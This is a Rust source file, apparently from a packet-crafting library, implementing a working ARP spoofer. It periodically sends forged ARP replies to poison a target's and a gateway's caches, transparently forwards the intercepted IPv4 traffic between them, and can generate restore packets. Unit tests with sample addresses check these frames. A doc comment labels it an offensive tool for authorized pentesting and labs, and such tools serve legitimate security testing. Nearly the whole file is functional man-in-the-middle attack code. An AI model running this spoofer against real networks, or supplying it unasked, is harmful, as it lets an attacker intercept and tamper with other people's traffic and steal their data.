use std::net::Ipv4Addr;
use std::time::Duration;

use stackforge_core::layer::field::MacAddress;
use stackforge_core::{ArpBuilder, EthernetBuilder, LayerKind, Packet};

use crate::forwarder::rewrite_dst_mac;
use crate::traits::Automaton;

/// ARP spoofer with full MitM forwarding.
///
/// Periodically sends gratuitous ARP replies to poison the ARP caches of
/// both the target and the gateway, then forwards traffic between them
/// to maintain connectivity (transparent MitM).
///
/// **Authorization required**: This is an offensive security tool.
/// Only use in authorized pentesting engagements or lab environments.
pub struct ArpSpoofer {
    /// Target (victim) IP address.
    target_ip: Ipv4Addr,
    /// Gateway IP to impersonate.
    gateway_ip: Ipv4Addr,
    /// Our MAC address (the attacker's interface MAC).
    our_mac: MacAddress,
    /// Resolved target MAC address.
    target_mac: MacAddress,
    /// Resolved gateway MAC address.
    gateway_mac: MacAddress,
    /// Interval between gratuitous ARP sends.
    poison_interval: Duration,
    /// Whether to forward intercepted traffic.
    forward: bool,
}

impl ArpSpoofer {
    /// Create a new ARP spoofer.
    ///
    /// `target_mac` and `gateway_mac` must be pre-resolved (e.g., via ARP request).
    /// `our_mac` is the attacker's interface MAC.
    pub fn new(
        target_ip: Ipv4Addr,
        gateway_ip: Ipv4Addr,
        our_mac: MacAddress,
        target_mac: MacAddress,
        gateway_mac: MacAddress,
    ) -> Self {
        Self {
            target_ip,
            gateway_ip,
            our_mac,
            target_mac,
            gateway_mac,
            poison_interval: Duration::from_secs(2),
            forward: true,
        }
    }

    #[must_use]
    pub fn poison_interval(mut self, interval: Duration) -> Self {
        self.poison_interval = interval;
        self
    }

    #[must_use]
    pub fn forward(mut self, forward: bool) -> Self {
        self.forward = forward;
        self
    }

    /// Build a gratuitous ARP reply: "ip is-at our_mac"
    fn poison_packet(&self, target_ip: Ipv4Addr, target_mac: MacAddress, spoof_ip: Ipv4Addr) -> Vec<u8> {
        let eth = EthernetBuilder::new()
            .dst(target_mac)
            .src(self.our_mac)
            .build_with_payload(LayerKind::Arp);

        let arp = ArpBuilder::is_at(spoof_ip, self.our_mac)
            .pdst(target_ip)
            .hwdst(target_mac)
            .build();

        let mut frame = eth;
        frame.extend_from_slice(&arp);
        frame
    }

    /// Build ARP restore packet: "ip is-at real_mac"
    fn restore_packet(
        &self,
        target_ip: Ipv4Addr,
        target_mac: MacAddress,
        real_ip: Ipv4Addr,
        real_mac: MacAddress,
    ) -> Vec<u8> {
        let eth = EthernetBuilder::new()
            .dst(target_mac)
            .src(real_mac)
            .build_with_payload(LayerKind::Arp);

        let arp = ArpBuilder::is_at(real_ip, real_mac)
            .pdst(target_ip)
            .hwdst(target_mac)
            .build();

        let mut frame = eth;
        frame.extend_from_slice(&arp);
        frame
    }
}

impl Automaton for ArpSpoofer {
    fn bpf_filter(&self) -> Option<String> {
        // Capture traffic destined to our MAC (the poisoned traffic)
        // and ARP for monitoring
        Some(format!(
            "ether dst {} or arp",
            format_mac(&self.our_mac)
        ))
    }

    fn is_request(&self, pkt: &Packet) -> bool {
        if !self.forward {
            return false;
        }

        // We want to forward non-ARP IP traffic that arrives at our MAC
        // due to ARP poisoning
        let buf = pkt.as_bytes();
        if buf.len() < 14 {
            return false;
        }

        // Check ethertype is IPv4 (0x0800) — we forward IP traffic
        let ethertype = u16::from_be_bytes([buf[12], buf[13]]);
        if ethertype != 0x0800 {
            return false;
        }

        // Check source MAC — only forward from target or gateway
        let src_mac = MacAddress::new([buf[6], buf[7], buf[8], buf[9], buf[10], buf[11]]);
        src_mac == self.target_mac || src_mac == self.gateway_mac
    }

    fn make_reply(&self, request: &Packet) -> Option<Vec<u8>> {
        let buf = request.as_bytes();
        if buf.len() < 14 {
            return None;
        }

        let src_mac = MacAddress::new([buf[6], buf[7], buf[8], buf[9], buf[10], buf[11]]);

        if src_mac == self.target_mac {
            // Traffic from victim → should go to gateway
            let forwarded = rewrite_dst_mac(buf, self.gateway_mac);
            Some(forwarded)
        } else if src_mac == self.gateway_mac {
            // Traffic from gateway → should go to victim
            let forwarded = rewrite_dst_mac(buf, self.target_mac);
            Some(forwarded)
        } else {
            None
        }
    }

    fn tick_interval(&self) -> Option<Duration> {
        Some(self.poison_interval)
    }

    fn on_tick(&mut self) -> Option<Vec<Vec<u8>>> {
        // Send poison packets to both target and gateway
        let poison_target = self.poison_packet(self.target_ip, self.target_mac, self.gateway_ip);
        let poison_gateway = self.poison_packet(self.gateway_ip, self.gateway_mac, self.target_ip);
        Some(vec![poison_target, poison_gateway])
    }

    fn on_stop(&mut self) {
        // Restore is handled by the Python/caller layer — they should send
        // restore packets. We just log intent here.
        // In a real deployment, the caller should call restore() before dropping.
    }
}

impl ArpSpoofer {
    /// Generate restore packets to undo the ARP poisoning.
    /// The caller should send these packets before stopping.
    pub fn restore_packets(&self) -> Vec<Vec<u8>> {
        vec![
            // Tell target the real gateway MAC
            self.restore_packet(self.target_ip, self.target_mac, self.gateway_ip, self.gateway_mac),
            // Tell gateway the real target MAC
            self.restore_packet(self.gateway_ip, self.gateway_mac, self.target_ip, self.target_mac),
        ]
    }
}

fn format_mac(mac: &MacAddress) -> String {
    let o = mac.0;
    format!(
        "{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
        o[0], o[1], o[2], o[3], o[4], o[5]
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_spoofer() -> ArpSpoofer {
        ArpSpoofer::new(
            Ipv4Addr::new(192, 168, 1, 100),  // target
            Ipv4Addr::new(192, 168, 1, 1),     // gateway
            MacAddress::new([0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff]), // our mac
            MacAddress::new([0x11, 0x22, 0x33, 0x44, 0x55, 0x66]), // target mac
            MacAddress::new([0x77, 0x88, 0x99, 0xaa, 0xbb, 0xcc]), // gateway mac
        )
    }

    #[test]
    fn test_poison_packets_generated_on_tick() {
        let mut spoofer = make_spoofer();
        let packets = spoofer.on_tick().unwrap();
        assert_eq!(packets.len(), 2);

        // Both should be valid Ethernet+ARP frames
        for pkt in &packets {
            assert!(pkt.len() >= 42); // 14 eth + 28 arp
            // Ethertype should be ARP (0x0806)
            assert_eq!(pkt[12], 0x08);
            assert_eq!(pkt[13], 0x06);
        }
    }

    #[test]
    fn test_restore_packets() {
        let spoofer = make_spoofer();
        let restore = spoofer.restore_packets();
        assert_eq!(restore.len(), 2);

        // First restore: tell target about real gateway MAC
        // dst should be target MAC
        assert_eq!(&restore[0][0..6], &[0x11, 0x22, 0x33, 0x44, 0x55, 0x66]);
        // src should be gateway MAC (the real one)
        assert_eq!(&restore[0][6..12], &[0x77, 0x88, 0x99, 0xaa, 0xbb, 0xcc]);
    }

    #[test]
    fn test_forward_from_target() {
        let spoofer = make_spoofer();

        // Build a fake IP packet from the target
        let mut frame = vec![0u8; 60];
        // dst MAC = our mac (poisoned destination)
        frame[0..6].copy_from_slice(&[0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff]);
        // src MAC = target mac
        frame[6..12].copy_from_slice(&[0x11, 0x22, 0x33, 0x44, 0x55, 0x66]);
        // ethertype = IPv4
        frame[12] = 0x08;
        frame[13] = 0x00;

        let mut pkt = Packet::from_bytes(frame);
        let _ = pkt.parse();

        assert!(spoofer.is_request(&pkt));

        let reply = spoofer.make_reply(&pkt).unwrap();
        // Forwarded packet dst MAC should be gateway MAC
        assert_eq!(&reply[0..6], &[0x77, 0x88, 0x99, 0xaa, 0xbb, 0xcc]);
    }

    #[test]
    fn test_bpf_filter_format() {
        let spoofer = make_spoofer();
        let filter = spoofer.bpf_filter().unwrap();
        assert!(filter.contains("ether dst"));
        assert!(filter.contains("arp"));
    }
}
